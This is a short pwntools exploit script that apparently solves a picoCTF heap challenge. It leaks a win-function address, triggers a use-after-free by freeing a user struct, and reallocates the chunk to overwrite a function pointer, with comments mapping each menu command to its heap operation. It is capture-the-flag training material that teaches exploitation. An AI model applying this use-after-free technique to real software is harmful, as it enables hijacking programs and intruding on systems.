#!/usr/bin/env python3
from pwn import *

PORT =  56665
HOST = "wily-courier.picoctf.net"
exe = context.binary = ELF('./vuln', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
        	b*0x08048d92
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()


p.sendline(b's')
p.recvuntil(b"Memory leak...")
win = int(p.recvline()[:-1], 16)
log.info("leak: "+ hex(win))

p.sendline(b'i')
p.sendlineafter(b'(Y/N)?', b'Y')
# GDB()

p.sendline(b'l')
p.sendafter(b'anyways:\n', p32(win))

p.interactive()

# 'i' -> free(user) 
# 's' -> leak win
# 'm' -> getline(user->username)
# 'l' -> malloc(8) -> read